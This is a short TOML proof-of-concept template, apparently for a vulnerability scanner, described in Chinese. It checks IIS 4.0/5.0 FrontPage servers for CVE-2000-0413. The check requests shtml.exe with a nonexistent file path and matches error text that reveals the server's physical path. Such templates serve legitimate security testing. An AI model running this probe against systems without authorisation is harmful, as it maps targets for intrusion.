[info]
author = "ave"
description = "通过请求 IIS 4.0/5.0 上 FrontPage 扩展的 shtml.exe 并传入不存在的文件路径，触发错误响应泄露服务器上文件的物理绝对路径。"
id = "POC-AVE-2000-0341"
name = "Microsoft IIS 4.0/5.0 FrontPage shtml.exe 路径泄露 PoC"
severity = "medium"
tags = ["ave-2000-0341"]
vuln_id = [
    "CVE-2000-0413",
    "AVE-2000-0341",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/nonexistent.htm"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "physical path",
    "Server.MapPath",
    "Path",
]
